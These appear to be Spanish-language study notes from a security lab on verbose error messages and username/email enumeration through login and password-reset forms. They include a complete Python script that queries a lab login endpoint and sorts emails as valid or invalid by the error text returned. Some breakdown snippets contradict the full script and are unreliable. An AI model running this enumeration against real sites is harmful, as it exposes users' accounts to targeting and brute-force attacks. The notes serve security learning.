<h2>Entendiendo la Verbosidad de Errores</h2>
Imagina que eres un detective con un don para encontrar pistas que otros pasan por alto. En el mundo del desarrollo web, la verbosidad de errores son susurros inintencionados de un sistema, revelando secretos que deberían estar esscondidos.

La verbosidad de errores puede revelar detalles como:

- **Rutas Internas:** Como un mapa del tesoro, revelan la estructura de la aplicación o servidor.
- **Detalles de Bases de Datos:** Ofrece un vistazo a la base de datos.
- **Información de Usuario:** A veces, estos errores pueden dar pistas sobre nombres de usuarios.

-------------------------------
<h2>Induciendo Verbosidad de Errores</h2>
Los atacantes indicen errores como manera de forzar a la aplicación a revelar sus secretos. Debajo, algunas de las técnicas más utilizadas:

1. **Invalid Login Attempts:** Esto es como picar en todas las puertas para ver cuál se abre. Al introducir nombres erróneos de usuario o contraseñas, los atacantes pueden disparar mensajes de errorque ayuden a distinguir entre nombres de usuario válidos e inválidos.
2. **SQL Injection:** Esta técnica implica inyectar código SQL malicioso en cada campo, con la esperanza de que el sistema pete y mande mensajes de error que no debería.
3. **File Inclusion/Path Traversal:** Manipulando rutas de archivos, los atacantes pueden intentar acceder a archivos restringidos llevando al sistema a errores que revelen rutas internas.
4. **Form Manipulation:** Jugar con los campos de un formulario puede engañasr a la aplicación para que muestre mensajes de error reveladores sobre el backend o la lógica.
5. **Application Fuzzing:** Mandar inputs no esperados a varias partes de la aplicación, para ver cómo reacciona, puede ayudar a identificar puntos débiles. Por ejemplo, herramientas como el Intruder de Burp Suite se usan para automatizar el proceso.

----------------------------------
<h2>El Rol de la Enumeración y la Fuerza Bruta</h2>
Cuando se trata de violar la autentificación, la enumeración y la fuerza bruta suelen ir de la mano:

- **Enumeración de Usuarios:** Descubrir nombres de usuario válidos configura el entorno, reduciendo el tiempo de adivinacióon del ataque posterior de fuerza bruta.
- **Exxplotar Verbosidad de Errores:** Los detalles encontrados gracias a estos errores pueden iluminar aspectos como las políticas de contraseñas y mecanismos de bloqueo de cuenta, allanando el camino de las estrategias de fuerza bruta.

En resumen, los errores de verbose son como migas de pan que llevan a los atacantes a partes profundas del sistema.

------------------------------
<h2>Enumeración en Formularios de Autentificación</h2>
En este [reporte](https://hackerone.com/reports/1166054) de HackerOne, este atacante fue capaz de enumerar usuarios usando la función de "Olvidé mi Contraseña" de la página.

Si vas a la página ofrecida por esta unidad e introduces un correo no registrado obtendrás el siguiente mensaje:

![[Pasted image 20251202132943.png]]

Sin embargo, si el correo está registrado, el sitio web responderá con un mensaje de "invalid Passwoord", indicando que el email existe pero la contraseña es incorrecta.

![[Pasted image 20251202133041.png]]

--------------------------------------
<h2>Automatización</h2>
Aquí debajo tienes un script de Python que comprobará emails válidos en la página web objetivo.

```python
import requests
import sys

def check_email(email):
    url = 'http://enum.thm/labs/verbose_login/functions.php'  # Location of the login function
    headers = {
        'Host': 'enum.thm',
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Accept': 'application/json, text/javascript, */*; q=0.01',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Requested-With': 'XMLHttpRequest',
        'Origin': 'http://enum.thm',
        'Connection': 'close',
        'Referer': 'http://enum.thm/labs/verbose_login/',
    }
    data = {
        'username': email,
        'password': 'password',  # Use a random password as we are only checking the email
        'function': 'login'
    }

    response = requests.post(url, headers=headers, data=data)
    return response.json()

def enumerate_emails(email_file):
    valid_emails = []
    invalid_error = "Email does not exist"  # Error message for invalid emails

    with open(email_file, 'r') as file:
        emails = file.readlines()

    for email in emails:
        email = email.strip()  # Remove any leading/trailing whitespace
        if email:
            response_json = check_email(email)
            if response_json['status'] == 'error' and invalid_error in response_json['message']:
                print(f"[INVALID] {email}")
            else:
                print(f"[VALID] {email}")
                valid_emails.append(email)

    return valid_emails

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <email_list_file>")
        sys.exit(1)

    email_file = sys.argv[1]

    valid_emails = enumerate_emails(email_file)

    print("\nValid emails found:")
    for valid_email in valid_emails:
        print(valid_email)
```

<h4>Desglose</h4>
<h6>Importaciones</h6>
- **requests:** Una librería de Python para hacer peticiones HTTP. Se usa para interactuar con el servidor web mandando peticiones POST al endpoint objetivo.

```python
import requests
```

<h6>Setup</h6>
- **url:** El script apunta al endpoint objetivo que maneja la funcionalidad de login de la aplicación.

```python
url = 'http://enum.thm/labs/verbose_login/functions.php'
```

- **headers:** Una colección de headers HTTP se define para imitar una petición típica de navegador, asegurando que las peticiones parezcan legítimas.

```python
headers = {
      'Host': 'enum.thm',
      'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:102.0) Gecko/20100101 Firefox/102.0',
      'Accept': 'application/json, text/javascript, */*; q=0.01',
      'Accept-Language': 'en-US,en;q=0.5',
      'Accept-Encoding': 'gzip, deflate',
      'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
      'X-Requested-With': 'XMLHttpRequest',
      'Origin': 'http://enum.thm',
      'Connection': 'close',
      'Referer': 'http://enum.thm/labs/verbose_login/',
  }
```

<h6>Inicialización de variables</h6>
- **valid_emails:** Un array guarda las direcciones de email válidas.

```python
valid_emails = []
```

- **invalid_error:** Una string contiene el mensaje de error específico usado para identificar correos inválidos.

```python
invalid_error = 'Email does not exist'
```

<h6>Loop Principal</h6>
- El script comprueba los emails dados y mira si son válidos usando la función `check_email`.

```python
for email in email_list:
    check_email(email)
```

<h6>Confección y Mandado de Peticiones</h6>
- Para cada email, el script construye un diccionario de información que incluye la dirección de email, un placeholder "password" y un comando que ejecuta la función login.

```python
data = {'username': email, 'password': 'password', 'action': 'login'}
response = requests.post(url, headers=headers, data=data)
```

<h6>Manejo de Respuestas</h6>
- La respuesta del servidor se procesa para comprobar su el email dado existe, basándose en la existendia de un error específico en la información JSON.

```python
if invalid_error in response.text:
    print(f"{email} is invalid.")
else:
    print(f"{email} is valid.")
    valid_emails.append(email)
```

<h6>Verificación de Caracteres</h6>
- Los emails confirmados se unen a la lista `valid_emails`.

```python
for email in valid_emails:
    print(f"Valid email found: {email}")
```

Podemos usar una lista de emails comunes de este [repositorio](https://github.com/nyxgeek/username-lists/blob/master/usernames-top100/usernames_gmail.com.txt).

![[Pasted image 20251202143925.png]]

Una vez hayas descargado la lista, usa el script para comprobar emails válidos.

